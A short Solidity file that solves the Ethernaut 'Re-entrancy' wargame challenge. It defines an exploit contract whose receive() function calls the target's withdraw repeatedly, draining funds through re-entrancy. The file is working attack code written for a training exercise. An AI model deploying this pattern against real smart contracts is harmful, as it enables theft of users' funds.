// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution for https://ethernaut.openzeppelin.com/ challenge 11 (Re-entrancy)

abstract contract ReEntrancyTarget {
    function donate(address _to) public payable virtual;
    function withdraw(uint256 _amount) public virtual;
    function balanceOf(address _who) public view virtual returns (uint256 balance);
}

contract ReEntrancyExploit {
    ReEntrancyTarget public targetContract;

    constructor(address _target) {
        targetContract = ReEntrancyTarget(_target);
    }

    function donate() public payable {
        targetContract.donate{value: msg.value}(address(this));
    }

    function withdraw() public {
        targetContract.withdraw(targetContract.balanceOf(address(this)));
    }

    receive() external payable {
        targetContract.withdraw(targetContract.balanceOf(address(this)));
    }
}
